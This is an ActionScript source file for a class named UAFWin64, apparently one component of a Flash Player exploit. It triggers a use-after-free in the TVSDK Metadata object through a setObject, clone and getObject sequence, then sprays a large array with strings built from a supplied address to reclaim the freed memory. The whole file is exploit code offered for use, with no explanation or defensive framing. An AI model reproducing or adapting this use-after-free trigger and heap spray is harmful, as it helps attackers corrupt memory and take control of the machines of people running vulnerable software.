package 
{
	import flash.display.*;
	import flash.net.*;
	import com.adobe.tvsdk.mediacore.events.*;
	import com.adobe.tvsdk.mediacore.timeline.advertising.*;
	import com.adobe.tvsdk.mediacore.*;
	import com.adobe.tvsdk.mediacore.qos.metrics.*;
	import com.adobe.tvsdk.mediacore.metadata.*;
	import com.adobe.tvsdk.mediacore.utils.*;
	import flash.accessibility.*; 
	import flash.utils.ByteArray;
	import flash.utils.Dictionary;
	
	/**
	 * ...
	 * @author ...
	 */
	public class UAFWin64 extends GlobalWin64
	{
		
		public function UAFWin64() 
		{
			
		}
		
		public static var arr:Array = [];
		
		public function go(addr:*)
		{
			_g_dic = new Dictionary();
			
			//ctor
			var ins_String_0 = new String();
			var ins_MediaPlayerItemEvent_0:MediaPlayerItemEvent = new MediaPlayerItemEvent(8, null, null);

			var ins_Metadata_0 = new Metadata();
			var resultArr:Array = new Array();
			
			var setargs1:Array = [];			
			setargs1.push(ins_String_0);
			setargs1.push(ins_MediaPlayerItemEvent_0);

			invoke_ins_method("setObject", ins_Metadata_0, setargs1);
			
			if(_g_dic.hasOwnProperty("object") == false)
				_g_dic["object"] = new Array();
			
			var getargs:Array = new Array();
			getargs.push(ins_String_0);

			_g_dic["object"].push(invoke_ins_method("getObject", ins_Metadata_0, getargs));

			var setargs1:Array = [];
			var ins_Metadata_1 = invoke_ins_method("clone", ins_Metadata_0, setargs1);
			
			var setargs1:Array = [];			
			setargs1.push(ins_String_0);
			setargs1.push(_g_dic["object"][0]);
			invoke_ins_method("setObject", ins_Metadata_1, setargs1);
			setargs1.pop();
			setargs1.pop();
			
			var getargs:Array = new Array();
			getargs.push(ins_String_0);

			_g_dic["object"].push(invoke_ins_method("getObject", ins_Metadata_1, getargs));
			
			for (var j = 0; j < 0x1000/2; j++)
			{
				arr[j] = FormatClassName("MetadataMetadataMetadataMeta*_1<String>") + addr;
			}

		}
		
		public function invoke_ins_method(funcName:String, instance:Object, args:Array):*
		{
			var func:Function;
			if (instance != null)
				func = (instance[funcName] as Function);
			else
				return null;

			var result:* = null;
			var error:Error = null;
			
			try {
				result = func.apply(instance, args);
			}catch (e:Error) 
			{
				error = e;
			}

			return result;
		}
		
		public function FormatClassName(classTypeName:String):String
		{
			var ctName:String = classTypeName.replace(/::/g, "__");
			ctName = ctName.replace(/</g, "");
			ctName = ctName.replace(/>/g, "");
			ctName = ctName.replace(/\*/g, "star");
			return ctName.replace(/\./g, "_");
		}
	}

}